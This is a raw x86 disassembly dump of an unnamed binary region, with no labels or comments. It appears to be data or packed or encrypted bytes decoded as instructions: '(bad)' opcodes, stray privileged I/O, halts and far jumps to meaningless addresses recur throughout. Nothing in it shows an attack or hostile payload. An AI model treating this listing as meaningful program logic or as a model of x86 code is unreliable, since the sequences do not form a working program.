  424eee:	test   al,0x61
  424ef0:	xor    al,BYTE PTR [ebx]
  424ef2:	lods   al,BYTE PTR ds:[esi]
  424ef3:	sbb    ecx,DWORD PTR [eax]
  424ef5:	push   esp
  424ef6:	pop    ds
  424ef7:	fild   QWORD PTR ds:0x9a37c53
  424efd:	je     0x424f17
  424eff:	es inc esi
  424f01:	dec    ecx
  424f02:	rcl    esi,1
  424f04:	in     al,0x69
  424f06:	cwde   
  424f07:	jmp    0x64cbabbc
  424f0c:	adc    al,0x5d
  424f0e:	stos   DWORD PTR es:[edi],eax
  424f0f:	push   eax
  424f10:	mov    ebx,0xd4025b30
  424f15:	int    0x60
  424f17:	cmp    al,0xbd
  424f19:	or     al,0x5
  424f1b:	lods   eax,DWORD PTR ds:[esi]
  424f1c:	imul   edi,DWORD PTR [ebp+ebx*2+0x50],0x9bb5365c
  424f24:	mov    ds:0x74bff366,eax
  424f29:	pop    esi
  424f2a:	cmp    BYTE PTR [edi-0x650a5f0b],al
  424f30:	nop
  424f31:	jmp    0x424fa1
  424f33:	sub    al,dl
  424f35:	aas    
  424f36:	int    0xdf
  424f38:	dec    edi
  424f39:	xchg   esi,eax
  424f3a:	mov    dl,0x22
  424f3c:	es push es
  424f3e:	aam    0xf1
  424f40:	cld    
  424f41:	cmc    
  424f42:	pusha  
  424f43:	jge    0x424fbc
  424f45:	dec    esp
  424f46:	loope  0x424f68
  424f48:	ja     0x424f52
  424f4a:	sbb    al,0x9f
  424f4c:	mov    edx,DWORD PTR [eax-0x29f73974]
  424f52:	jb     0x424ed8
  424f54:	pop    ss
  424f55:	mov    ds:0x45d37e9f,al
  424f5a:	pop    ecx
  424f5b:	xchg   edi,eax
  424f5c:	shl    DWORD PTR [edx-0x4c],1
  424f5f:	rcr    BYTE PTR [esi-0x23ac6645],cl
  424f65:	clc    
  424f66:	rcr    ebx,1
  424f68:	pop    ebx
  424f69:	jno    0x424f64
  424f6b:	cld    
  424f6c:	cmp    al,0x93
  424f6e:	jge    0x424f4d
  424f70:	test   eax,0x4f38c652
  424f75:	mov    ebp,0x157a6343
  424f7a:	add    bh,bl
  424f7c:	cmp    BYTE PTR [eax],ah
  424f7e:	xor    bl,ah
  424f80:	sbb    al,0x18
  424f82:	mov    esi,0x32a7550
  424f87:	repz pushf 
  424f89:	in     al,0x2
  424f8b:	push   edx
  424f8c:	not    bh
  424f8e:	or     BYTE PTR gs:[esi+0x7b],0x17
  424f93:	and    DWORD PTR [ebx],ebx
  424f95:	jns    0x424f64
  424f97:	push   0xe5a7715a
  424f9c:	(bad)  [ecx+0x66]
  424f9f:	mov    ch,0xbf
  424fa1:	push   ds
  424fa2:	stos   BYTE PTR es:[edi],al
  424fa3:	xchg   esp,eax
  424fa4:	sub    esi,DWORD PTR [ebx-0xc]
  424fa7:	in     al,dx
  424fa8:	pop    ds
  424fa9:	enter  0xbddd,0x3e
  424fad:	cmp    eax,0xd323ecf4
  424fb2:	test   DWORD PTR [eax+0x25],ebx
  424fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fb6:	pusha  
  424fb7:	jp     0x424faf
  424fb9:	daa    
  424fba:	xor    esi,DWORD PTR [edi+0x325eab50]
  424fc0:	adc    DWORD PTR [edi+0x6bbac442],eax
  424fc6:	aam    0xaa
  424fc8:	fcom   DWORD PTR [ebx]
  424fca:	repnz pop edi
  424fcc:	or     DWORD PTR [esi],esp
  424fce:	(bad)  
  424fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fd0:	cdq    
  424fd1:	jbe    0x42504b
  424fd3:	fwait
  424fd4:	bound  esi,QWORD PTR [edi]
  424fd6:	push   esi
  424fd7:	push   ecx
  424fd8:	jp     0x425045
  424fda:	scas   eax,DWORD PTR es:[edi]
  424fdb:	add    BYTE PTR ds:0xeba101b2,cl
  424fe1:	shl    ecx,cl
  424fe3:	pop    ebx
  424fe4:	in     al,0xee
  424fe6:	scas   al,BYTE PTR es:[edi]
  424fe7:	mov    bp,0x4d5e
  424feb:	mov    esi,0x26e3
	...
  425054:	add    BYTE PTR [eax],al
  425056:	dec    ebx
  425057:	push   ss
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	(bad)  
  425063:	sbb    BYTE PTR [eax+0x18d6716],dl
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [esi+0x3dd37115],bh
  425073:	sbb    al,0x55
  425075:	pop    esp
  425076:	enter  0x71c8,0x10
  42507a:	mov    al,0x59
  42507c:	fwait
  42507d:	pop    ecx
  42507e:	scas   eax,DWORD PTR es:[edi]
  42507f:	fcom   DWORD PTR [edx]
  425081:	loop   0x425020
  425083:	xchg   ecx,eax
  425084:	mov    edi,0x34e77a4
  425089:	xchg   esi,eax
  42508a:	adc    eax,ebx
  42508c:	cmp    DWORD PTR [eax],edx
  42508e:	xor    cl,bh
  425090:	loop   0x425066
  425092:	push   0xffffffc6
  425094:	lods   al,BYTE PTR ds:[esi]
  425095:	and    DWORD PTR [esi+0x15b7d862],esi
  42509b:	push   eax
  42509c:	adc    eax,0x40a74495
  4250a1:	stos   DWORD PTR es:[edi],eax
  4250a2:	rol    DWORD PTR [esi],cl
  4250a4:	fs ret 
  4250a6:	xor    al,0x92
  4250a8:	xchg   edx,eax
  4250a9:	fstp   DWORD PTR [esi]
  4250ab:	xchg   ecx,eax
  4250ac:	ss (bad) 
  4250ae:	sti    
  4250af:	add    al,0xbe
  4250b1:	mov    al,ds:0x9f4ecca9
  4250b6:	rol    DWORD PTR [ecx-0x48],0x62
  4250ba:	mov    edx,0x37e5f0f0
  4250bf:	dec    edi
  4250c0:	push   edi
  4250c1:	sbb    eax,0x43a15b04
  4250c6:	mov    edi,edi
  4250c8:	sar    DWORD PTR [ebx+0x60f9e4af],1
  4250ce:	call   0x7d58:0x5759ec09
  4250d5:	adc    eax,0x636c15b1
  4250da:	iret   
  4250db:	popa   
  4250dc:	mov    ds:0xb9fa621c,al
  4250e1:	pop    ecx
  4250e2:	scas   al,BYTE PTR es:[edi]
  4250e3:	jge    0x425155
  4250e5:	pop    es
  4250e6:	adc    bl,BYTE PTR [ecx-0x60]
  4250e9:	in     eax,dx
  4250ea:	fcmovne st,st(4)
  4250ec:	int3   
  4250ed:	push   es
  4250ee:	xlat   BYTE PTR ds:[ebx]
  4250ef:	mov    esp,0xa742b51d
  4250f4:	ins    DWORD PTR es:[edi],dx
  4250f5:	bound  edx,QWORD PTR [ecx-0x63]
  4250f8:	das    
  4250f9:	inc    esi
  4250fa:	cmc    
  4250fb:	pop    ebp
  4250fc:	adc    edi,DWORD PTR [eax-0x1b]
  4250ff:	stos   BYTE PTR es:[edi],al
  425100:	inc    ecx
  425101:	or     eax,DWORD PTR [eax+0x19305107]
  425107:	sbb    esp,DWORD PTR [ebp-0x20a303d9]
  42510d:	iret   
  42510e:	jns    0x42516e
  425110:	push   ecx
  425111:	dec    eax
  425112:	and    al,0xa4
  425114:	sbb    eax,0xb18bd83c
  425119:	hlt    
  42511a:	cdq    
  42511b:	xchg   edi,ebx
  42511d:	push   ecx
  42511e:	out    0xb9,al
  425120:	jmp    0x34c6:0x6cc474f4
  425127:	sub    al,0xf5
  42512a:	gs jo  0x42514b
  42512d:	mov    edx,0xf0a02a12
  425132:	or     edi,ebx
  425134:	mov    ds:0xfb8b97fd,al
  425139:	push   ecx
  42513a:	mov    ebp,0xba42a857
  42513f:	jmp    eax
  425141:	pop    edi
  425142:	mov    ebp,DWORD PTR [esi+0x5d]
  425145:	mov    ch,0x4c
  425147:	dec    edi
  425148:	and    eax,DWORD PTR [ebp-0x5f52c53d]
  42514e:	mov    WORD PTR [ebx+0x62],fs
  425151:	cli    
  425152:	fprem1 
  425154:	sbb    bh,BYTE PTR [ebx-0x7]
  425157:	pop    esi
  425158:	in     eax,dx
  425159:	data16 sbb al,0x8d
  42515c:	or     DWORD PTR [ecx],ebx
  42515e:	test   DWORD PTR [ebp-0x65],esp
  425161:	scas   eax,DWORD PTR es:[edi]
  425162:	shl    BYTE PTR [edi+0x54],cl
  425165:	xor    BYTE PTR [esi+edi*8],bh
  425168:	adc    BYTE PTR [ecx],bh
  42516a:	cmp    edi,DWORD PTR [eax+0xa]
  42516d:	bound  eax,QWORD PTR [eax]
	...
  4251d3:	add    BYTE PTR [eax],al
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x2d9f:0x5a0f92e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [edi-0x43],ch
  4251f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f1:	cdq    
  4251f2:	mov    ds:0xc2456e3c,al
  4251f7:	repnz dec eax
  4251f9:	sub    ecx,esp
  4251fb:	test   BYTE PTR [ecx+0x229bf9ad],dl
  425201:	ds mov ecx,esp
  425204:	das    
  425205:	pop    eax
  425206:	pause  
  425208:	dec    edi
  425209:	jo     0x42520d
  42520b:	xor    dh,ah
  42520d:	cli    
  42520e:	clc    
  42520f:	jbe    0x425212
  425211:	lods   eax,DWORD PTR ds:[esi]
  425212:	aaa    
  425213:	stos   BYTE PTR es:[edi],al
  425214:	aaa    
  425215:	cmp    DWORD PTR [eax+0xd],ebx
  425218:	icebp  
  425219:	nop
  42521a:	imul   ebp,DWORD PTR [ebx+esi*1+0x52ebcdfa],0xffffff9b
  425222:	add    esi,DWORD PTR [eax+eax*4]
  425225:	fwait
  425226:	mov    cl,0xa7
  425228:	out    dx,eax
  425229:	mov    DWORD PTR [ebx+0x2],edi
  42522c:	cmp    al,0xbf
  42522e:	das    
  42522f:	adc    eax,0xe989af34
  425234:	or     dh,BYTE PTR [ebp-0x35]
  425237:	cwde   
  425238:	clc    
  425239:	nop
  42523a:	clc    
  42523b:	pop    es
  42523c:	xchg   esi,eax
  42523d:	ins    BYTE PTR es:[edi],dx
  42523e:	enter  0xdfd5,0x53
  425242:	mov    cx,0x2536
  425246:	cld    
  425247:	adc    edx,DWORD PTR [esi+0x46]
  42524a:	movq   mm4,QWORD PTR [eax]
  42524d:	test   dl,bh
  42524f:	or     eax,0xc71e8e93
  425254:	sub    eax,0x7acf9977
  425259:	adc    cl,bh
  42525b:	in     al,0xc9
  42525d:	aad    0xd3
  42525f:	(bad)  
  425260:	sub    edi,edx
  425262:	ret    0x57db
  425265:	adc    BYTE PTR [eax+eiz*8-0x51ab4e81],bl
  42526c:	xor    al,0x32
  42526e:	(bad)  
  42526f:	(bad)  
  425271:	adc    esi,DWORD PTR [ebx-0x3079391f]
  425277:	popf   
  425278:	cs inc ecx
  42527a:	fistp  DWORD PTR ds:0xf5f266b6
  425280:	retf   
  425281:	cmp    BYTE PTR ds:0xc4e73d8f,ch
  425287:	fistp  DWORD PTR [esi+0x63]
  42528a:	in     al,dx
  42528b:	arpl   WORD PTR [esi-0x20b271d9],ax
  425291:	ins    DWORD PTR es:[edi],dx
  425292:	call   FWORD PTR [eax+0x38a9959f]
  425298:	in     al,dx
  425299:	repz pop ecx
  42529b:	or     DWORD PTR ds:0x81f3a58b,esp
  4252a1:	push   ebp
  4252a2:	jg     0x4252c4
  4252a4:	mov    WORD PTR [edx+0x1],ds
  4252a7:	fidiv  DWORD PTR [esp+edx*8-0x1cb8934b]
  4252ae:	mov    ebp,0xb3ba7d9
  4252b3:	hlt    
  4252b4:	jmp    0xf24044e9
  4252b9:	xchg   BYTE PTR [ebx],bl
  4252bb:	(bad)  [ecx-0x653a2d82]
  4252c1:	out    dx,eax
  4252c2:	out    0xdf,eax
  4252c4:	push   edi
  4252c5:	outs   dx,BYTE PTR ds:[esi]
  4252c6:	loopne 0x4252a3
  4252c8:	mov    ebp,0x3154d2b5
  4252cd:	div    eax
  4252cf:	cmp    DWORD PTR [ebp+0x6e],eax
  4252d2:	xor    BYTE PTR [ebx+ecx*4],bh
  4252d5:	push   cs
  4252d6:	mov    edi,0xec5227c1
  4252db:	sbb    BYTE PTR ds:0xe5ce5dba,bl
  4252e1:	in     eax,0x5d
  4252e3:	dec    ebp
  4252e4:	adc    eax,DWORD PTR [ebx-0x73]
  4252e7:	jae    0x42527d
  4252e9:	shl    BYTE PTR [edx+0x477380],1
	...
  425353:	add    BYTE PTR [eax],al
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	not    ecx
  425364:	jnp    0x425332
  425366:	pop    DWORD PTR [bx+di]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [edx-0x494692d6],bh
  425373:	fucompp 
  425375:	imul   BYTE PTR [edi+0x1cc12a7e]
  42537b:	mov    DWORD PTR [eax-0x50],esi
  42537e:	mov    edx,0x3e0770b4
  425383:	ss pop eax
  425385:	mov    ds:0x3dbb930e,al
  42538a:	jecxz  0x425313
  42538c:	lea    ecx,[edx-0x27]
  42538f:	psrlw  mm7,QWORD PTR [edi-0x2d]
  425393:	retf   0xd3fd
  425396:	in     eax,dx
  425397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425398:	xor    ah,BYTE PTR [esi]
  42539a:	aaa    
  42539b:	push   ebp
  42539c:	(bad)  
  42539d:	cmp    esp,DWORD PTR [esi]
  42539f:	mov    esp,0xa68d1187
  4253a4:	test   BYTE PTR [esp+esi*8],ch
  4253a7:	mov    eax,ecx
  4253a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253aa:	aas    
  4253ab:	inc    eax
  4253ac:	fisttp DWORD PTR [ebx+ebx*4+0x9]
  4253b0:	jg     0x425350
  4253b2:	jecxz  0x425365
  4253b4:	jns    0x4253de
  4253b6:	mov    cs,WORD PTR [ecx-0x20cdb283]
  4253bc:	scas   al,BYTE PTR es:[edi]
  4253bd:	icebp  
  4253be:	imul   ebx,DWORD PTR [ecx+ecx*2-0x6f3264d6],0xe3bc063a
  4253c9:	sub    eax,DWORD PTR [ebp-0x7b]
  4253cc:	dec    esi
  4253cd:	add    DWORD PTR [ebp-0xc],0x61d5c78e
  4253d4:	aas    
  4253d5:	fwait
  4253d6:	cmp    DWORD PTR [edi+0x2d],esp
  4253d9:	pusha  
  4253da:	xchg   edi,eax
  4253db:	mov    ecx,0x61367f07
  4253e0:	imul   esi,DWORD PTR [ecx+0x46179e7a],0x3f457eeb
  4253ea:	sub    BYTE PTR [ecx-0x7f8db59c],dh
  4253f0:	and    eax,0x36c1d765
  4253f5:	shr    DWORD PTR ds:[edx+0x58c3f0fa],1
  4253fc:	push   edx
  4253fd:	lahf   
  4253fe:	push   0x9305f7ce
  425403:	push   es
  425404:	in     al,0x1
  425406:	sub    eax,0x3d6f1880
  42540b:	loopne 0x42539b
  42540d:	rcr    al,cl
  42540f:	cmp    dl,ah
  425411:	lods   eax,DWORD PTR ds:[esi]
  425412:	pop    ss
  425413:	cmp    ebx,DWORD PTR [edi+edx*8+0x31]
  425417:	dec    esp
  425418:	call   0x79d:0x3193791b
  42541f:	add    al,0x8f
  425421:	dec    ebp
  425422:	adc    BYTE PTR [edi+0x39],al
  425425:	dec    esp
  425426:	es dec ecx
  425428:	stos   BYTE PTR es:[edi],al
  425429:	(bad)  
  42542b:	pop    eax
  42542c:	adc    bh,BYTE PTR [edx-0x25a0d1d1]
  425432:	sub    BYTE PTR cs:[esi+esi*4-0x62c93685],ah
  42543a:	int3   
  42543b:	pushf  
  42543c:	idiv   BYTE PTR [esi-0x44]
  42543f:	pop    esp
  425440:	stc    
  425441:	outs   dx,BYTE PTR ds:[esi]
  425442:	lock jg 0x425480
  425445:	push   0xc01aa808
  42544a:	outs   dx,BYTE PTR ds:[esi]
  42544b:	mov    esp,0xf4ddd54c
  425450:	and    BYTE PTR [edx+0x21df2e99],cl
  425456:	mul    esi
  425458:	jne    0x42541d
  42545a:	out    0x76,al
  42545c:	sbb    al,dl
  42545e:	jmp    0xe9fe:0x805bcf97
  425465:	fld    DWORD PTR [edx-0x35]
  425468:	xchg   ebp,eax
  425469:	xchg   ebx,eax
  42546a:	inc    DWORD PTR [ebx]
  42546c:	enter  0x67,0x0
	...
  4254d4:	add    BYTE PTR [eax],al
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    ebx,DWORD PTR [eax-0x17]
  4254e4:	pop    edx
  4254e5:	push   ebp
  4254e6:	addr16 nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	mov    al,0x53
  4254f0:	int    0x99
  4254f2:	cmp    DWORD PTR [edi+0x39cb02eb],edx
  4254f8:	sub    BYTE PTR [ebp+0x2a],ch
  4254fb:	jp     0x425513
  4254fd:	mov    eax,0x946ba7bf
  425502:	ins    DWORD PTR es:[edi],dx
  425503:	rcl    BYTE PTR ds:0xa190d7c,0x35
  42550a:	mov    eax,ds:0xbe6288b7
  42550f:	xchg   DWORD PTR [edx],edi
  425511:	xor    eax,edx
  425513:	test   DWORD PTR es:[ecx+0x7178ef01],esi
  42551a:	mov    esp,0xec693026
  42551f:	mov    eax,DWORD PTR [eax+0x1130bbdf]
  425525:	mov    WORD PTR [esi],ds
  425527:	je     0x425591
  425529:	jns    0x42554a
  42552b:	push   ecx
  42552c:	dec    esp
  42552d:	adc    al,0x25
  42552f:	adc    ah,cl
  425531:	or     BYTE PTR [esi],ch
  425533:	push   esi
  425534:	dec    edx
  425535:	pop    esp
  425536:	gs mov bl,0x0
  425539:	in     al,0x24
  42553b:	push   eax
  42553c:	mov    BYTE PTR [ebx],dh
  42553e:	xchg   ecx,eax
  42553f:	push   edi
  425540:	mov    al,ds:0xce4369f4
  425545:	mov    ah,0x6
  425547:	sub    ecx,DWORD PTR [eax-0x60]
  42554a:	stos   BYTE PTR es:[edi],al
  42554b:	sub    bl,BYTE PTR [edi+0x45]
  42554e:	mov    ch,0x6
  425550:	dec    esp
  425551:	xor    BYTE PTR [esi+0x64],bh
  425554:	sahf   
  425555:	jecxz  0x4254f6
  425557:	push   ebp
  425558:	cmp    al,BYTE PTR [eax]
  42555a:	adc    bh,bh
  42555c:	pop    esi
  42555d:	push   edx
  42555e:	push   esp
  42555f:	cmp    cl,BYTE PTR ds:0xc1bd0e46
  425565:	sbb    BYTE PTR [edi],dl
  425567:	retf   
  425568:	shr    BYTE PTR [ebp-0xd],1
  42556b:	xchg   esp,eax
  42556c:	inc    esp
  42556d:	add    eax,0xbd898d71
  425572:	jge    0x425524
  425574:	or     al,0x73
  425576:	cwde   
  425577:	fst    QWORD PTR [esi]
  425579:	push   0x6b
  42557b:	push   es
  42557c:	dec    edi
  42557d:	mov    BYTE PTR [ecx-0x1250cccb],bh
  425583:	imul   eax,DWORD PTR [ebx+0x7c16dd53],0x6e
  42558a:	mov    ds:0x7d778717,eax
  42558f:	jns    0x4255a7
  425591:	sub    BYTE PTR [ecx+0x25],ah
  425594:	stc    
  425595:	iret   
  425596:	lods   al,BYTE PTR ds:[esi]
  425597:	nop
  425598:	rol    bh,cl
  42559a:	popa   
  42559b:	push   ebx
  42559c:	in     al,dx
  42559d:	scas   al,BYTE PTR es:[edi]
  42559e:	xchg   ah,al
  4255a0:	popa   
  4255a1:	pop    eax
  4255a2:	cs jmp 0xf1964942
  4255a8:	adc    DWORD PTR [edi+edi*2-0x44],0x12981b79
  4255b0:	(bad)  
  4255b1:	push   eax
  4255b2:	iret   
  4255b3:	ds mov ebp,ss
  4255b6:	sbb    al,0xf0
  4255b8:	push   edx
  4255b9:	mov    ebx,0x128aa5f2
  4255be:	mov    al,ds:0xf05fc1c
  4255c3:	and    al,0xd8
  4255c5:	xchg   ebx,eax
  4255c6:	adc    BYTE PTR [ecx],dh
  4255c8:	repnz rol BYTE PTR [ecx+0x1acd54bb],0x4a
  4255d0:	push   ebx
  4255d1:	push   ecx
  4255d2:	(bad)  [ecx+ebp*4]
  4255d5:	mov    al,ds:0x4812b4
  4255da:	dec    edi
  4255db:	stos   DWORD PTR es:[edi],eax
  4255dc:	xor    al,0x33
  4255de:	inc    ecx
  4255df:	inc    edi
  4255e0:	mov    al,0xb6
  4255e2:	xchg   edi,eax
  4255e3:	stc    
  4255e4:	pop    edi
  4255e5:	pop    es
  4255e6:	push   eax
  4255e7:	inc    esi
  4255e8:	gs popa 
  4255ea:	and    DWORD PTR [ebx+0x62e0],ecx
	...
  425654:	add    BYTE PTR [eax],al
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x79fcf13a
  425664:	fidivr DWORD PTR [edi+eiz*2+0x191]
  42566b:	add    DWORD PTR [eax],eax
  42566d:	add    ah,dl
  42566f:	bound  eax,QWORD PTR [edx]
  425671:	jl     0x42562d
  425673:	cwde   
  425674:	mov    ds:0x73060b3c,al
  425679:	loopne 0x42565a
  42567b:	je     0x4256db
  42567d:	jl     0x425653
  42567f:	sub    ah,BYTE PTR [edi]
  425681:	ins    DWORD PTR es:[edi],dx
  425682:	jnp    0x4256b4
  425684:	add    DWORD PTR [eax],ecx
  425686:	jns    0x4256c3
  425688:	xchg   ecx,eax
  425689:	lds    esp,FWORD PTR [esi]
  42568b:	cmp    ecx,edx
  42568d:	mov    eax,ds:0x69ce4f57
  425692:	add    ecx,DWORD PTR [ebx]
  425694:	popf   
  425695:	stc    
  425696:	push   ds
  425697:	mov    BYTE PTR [ecx+0x642b0885],ah
  42569d:	in     eax,dx
  42569e:	push   0xffffff91
  4256a0:	mov    ebp,0xdb31c3cd
  4256a5:	push   cs
  4256a6:	and    ah,BYTE PTR [edi-0xddaaacc]
  4256ac:	call   0x7ffb589e
  4256b1:	call   0x48cd:0x107ccc28
  4256b8:	jge    0x425670
  4256ba:	push   0xb9156081
  4256bf:	ret    0x301e
  4256c2:	xchg   ecx,eax
  4256c3:	bound  ecx,QWORD PTR [eax+0x5b441d84]
  4256c9:	sub    esi,DWORD PTR [ebp+0x467d3a04]
  4256cf:	(bad)  
  4256d0:	add    al,0x9e
  4256d2:	xchg   ecx,eax
  4256d3:	sbb    DWORD PTR [esi+edx*1],edi
  4256d6:	mov    ds,WORD PTR [ebp+0x1881efd1]
  4256dc:	bound  esp,QWORD PTR [eax+0x45424dd7]
  4256e2:	or     BYTE PTR [ebx+eax*8+0x6e],dl
  4256e6:	mov    bl,0xcd
  4256e8:	jp     0x42571f
  4256ea:	xchg   esi,eax
  4256eb:	jno    0x425723
  4256ed:	into   
  4256ee:	cdq    
  4256ef:	mov    ds:0x9450beff,al
  4256f4:	pusha  
  4256f5:	fadd   QWORD PTR [ebx]
  4256f7:	retf   0xade
  4256fa:	and    BYTE PTR [edx],bl
  4256fc:	iret   
  4256fd:	ror    BYTE PTR [ecx-0x40d18ca1],1
  425703:	sar    ecx,1
  425705:	and    al,0xbe
  425707:	pop    ds
  425708:	push   0xdd3f0039
  42570d:	sbb    ecx,ecx
  42570f:	icebp  
  425710:	sbb    ch,BYTE PTR [edx-0x72c0a6c5]
  425716:	std    
  425717:	xor    al,0x53
  425719:	scas   eax,DWORD PTR es:[edi]
  42571a:	fimul  DWORD PTR gs:[edi-0x5b03d46b]
  425721:	daa    
  425722:	or     ah,BYTE PTR [edi]
  425724:	retf   
  425725:	mov    cl,0x6b
  425727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425728:	lods   al,BYTE PTR ds:[esi]
  425729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42572a:	test   eax,0x45697fae
  42572f:	adc    al,bl
  425731:	dec    eax
  425732:	inc    edi
  425733:	imul   esi,DWORD PTR [edi],0x24b472dc
  425739:	xchg   ebx,eax
  42573a:	dec    eax
  42573b:	sub    eax,0xf46a91b7
  425740:	push   ebx
  425741:	pop    esp
  425742:	cmp    BYTE PTR [ebp+0x1c],bl
  425745:	add    dh,BYTE PTR [eax]
  425747:	sub    al,0xe6
  425749:	sahf   
  42574a:	fsubr  st,st(1)
  42574c:	popf   
  42574d:	retf   0xbe42
  425750:	push   es
  425751:	lea    edx,[eax]
  425753:	pushf  
  425754:	imul   ebx,DWORD PTR [edi],0xffffffe2
  425757:	repnz sbb edi,ebx
  42575a:	mov    DWORD PTR [edx-0x6b],ecx
  42575d:	push   esi
  42575e:	sbb    DWORD PTR [eax],esp
  425760:	mov    ?,WORD PTR [ecx-0x48a28bfa]
  425766:	push   esi
  425767:	cli    
  425768:	fdivrp st(7),st
  42576a:	pusha  
  42576b:	or     eax,0xab
	...
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x1968ca74
  4257e5:	sbb    al,0x67
  4257e7:	xchg   edx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	pop    ds
  4257ef:	jns    0x425838
  4257f1:	mov    cs,WORD PTR [edx+0x4f]
  4257f4:	mov    esp,0xbc247ce7
  4257f9:	push   0x2673f48c
  4257fe:	int    0x6a
  425800:	fldcw  WORD PTR [ecx-0xedee48c]
  425806:	pop    edi
  425807:	ss retf 
  425809:	jmp    0x4257d2
  42580b:	mov    al,0xac
  42580d:	lahf   
  42580e:	mov    ecx,0x8e0e6dba
  425813:	adc    eax,0x2a503eeb
  425818:	shl    BYTE PTR [ecx-0x61],0xee
  42581c:	inc    ebp
  42581d:	rcl    DWORD PTR [ecx],1
  42581f:	repnz ror bl,0x88
  425823:	call   0xfc50:0x24fcfde6
  42582a:	(bad)  
  42582c:	push   ss
  42582d:	icebp  
  42582e:	lods   al,BYTE PTR ds:[esi]
  42582f:	cmp    al,0xfa
  425831:	gs jne 0x425832
  425834:	or     dh,ah
  425836:	jb     0x4257fb
  425838:	dec    ecx
  425839:	or     DWORD PTR ds:[edx-0x7856faa2],esp
  425840:	cmp    DWORD PTR [edi+ebx*4-0x52e9cae1],esp
  425847:	outs   dx,BYTE PTR ds:[esi]
  425848:	jmp    0xe666:0xe1952af1
  42584f:	jmp    0x4258ab
  425851:	dec    ecx
  425852:	pushf  
  425853:	inc    esi
  425854:	pop    edi
  425855:	mov    ebp,0xfd946ac0
  42585a:	dec    edx
  42585b:	scas   al,BYTE PTR es:[edi]
  42585c:	cmp    al,0xbb
  42585e:	es hlt 
  425860:	ret    
  425861:	shr    DWORD PTR [edi-0x6f046cae],0x4c
  425868:	xchg   esi,eax
  425869:	push   esi
  42586a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42586b:	daa    
  42586c:	pushf  
  42586d:	mov    edi,0xdd489222
  425872:	sbb    DWORD PTR [edx-0x62b5559e],0xf5e3dcb4
  42587c:	xor    BYTE PTR [esi-0x288b1b8c],0x69
  425883:	and    al,0x50
  425885:	push   ds
  425886:	jecxz  0x425831
  425888:	jmp    0x8fde7495
  42588d:	pop    edi
  42588e:	sbb    al,0x8e
  425890:	push   cs
  425891:	cwde   
  425892:	mov    esi,0x25298af5
  425897:	repnz daa 
  425899:	fstp   TBYTE PTR [edi-0x7e]
  42589c:	mov    ch,0x3e
  42589e:	mov    ebp,0x59c124f0
  4258a3:	(bad)  
  4258a4:	ja     0x4258e7
  4258a6:	scas   al,BYTE PTR es:[edi]
  4258a7:	fwait
  4258a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258a9:	aam    0xc8
  4258ab:	enter  0xd949,0x4a
  4258af:	pop    esp
  4258b0:	fmul   st,st(3)
  4258b2:	dec    esp
  4258b3:	ss and ebp,esp
  4258b6:	mov    dl,ch
  4258b8:	mov    dl,0xd8
  4258ba:	ins    DWORD PTR es:[edi],dx
  4258bb:	mov    esi,0xc22469a
  4258c0:	loop   0x4258af
  4258c2:	(bad)
  4258c5:	sub    eax,0xbb60149d
  4258ca:	xor    ebx,DWORD PTR [esi]
  4258cc:	xchg   esp,eax
  4258cd:	xchg   edx,eax
  4258ce:	ja     0x42588f
  4258d0:	and    BYTE PTR [ebx],al
  4258d2:	mov    bl,0x63
  4258d4:	imul   esp,ebx,0x8
  4258d7:	pop    esp
  4258d8:	(bad)  
  4258d9:	into   
  4258da:	mov    edx,0x8637ed98
  4258df:	pop    ss
  4258e0:	mov    ecx,0xb8e9e5b6
  4258e5:	js     0x4258ba
  4258e7:	mov    DWORD PTR [edx],ebp
  4258e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258ea:	xchg   esp,eax
  4258eb:	cmp    al,0x63
  4258ed:	mov    DWORD PTR [eax],0x0
	...
  425953:	add    BYTE PTR [eax],al
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	loopne 0x4259dd
  425964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425965:	push   0x19367
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	mov    dl,BYTE PTR [ebx+0x2d]
  425971:	outs   dx,BYTE PTR ds:[esi]
  425972:	sahf   
  425973:	pop    ebp
